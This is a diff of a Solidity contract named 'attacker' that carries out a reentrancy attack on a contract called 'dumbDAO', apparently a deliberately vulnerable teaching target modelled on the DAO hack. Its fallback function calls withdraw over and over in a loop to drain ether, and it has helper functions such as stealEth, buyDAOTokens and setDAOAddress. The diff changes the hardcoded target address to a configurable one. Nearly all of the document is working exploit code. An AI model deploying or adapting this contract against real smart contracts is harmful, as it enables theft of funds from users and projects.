@@ -1,28 +1,27 @@
 import "dumbDAO.sol";
 
-
 contract attacker {
-    event DefaultFunc(address caller, uint amount);
+  event DefaultFunc(address caller, uint amount);
 
   address public daoAddress;
-  dumbDAO constant public dumb = dumbDAO(0x4720f79211edbbd6385b894fdd2d8b0beb8b15dc);
+  uint[] public arr;
+  uint public a = 0;
 
   function () {
-    //while loop
     DefaultFunc(msg.sender,msg.value);
-    uint a = 0;
     while (a<5) {
-      dumb.withdraw(this,1 ether); //function signature to withdraw
+      arr.push(a); //to help debug
+      dumbDAO(daoAddress).withdraw(this,msg.value);
       a++;
     }
   }
 
+  //fund contract without calling the default function
   function fundMe(){
-
   }
 
   function stealEth(uint _amount){
-    dumb.withdraw(this,_amount); //function signature to withdraw
+    dumbDAO(daoAddress).withdraw(this,_amount);
   }
 
   function payOut(address _payee) returns (bool){
@@ -31,7 +30,14 @@ contract attacker {
   }
 
   function buyDAOTokens(uint _amount){
-    dumb.buyTokens.value(_amount)();
+    dumbDAO(daoAddress).buyTokens.value(_amount)();
   }
 
+  function resetA() {
+    a=0;
+  }
+
+  function setDAOAddress(address _dao){
+    daoAddress=_dao;
+  }
 }
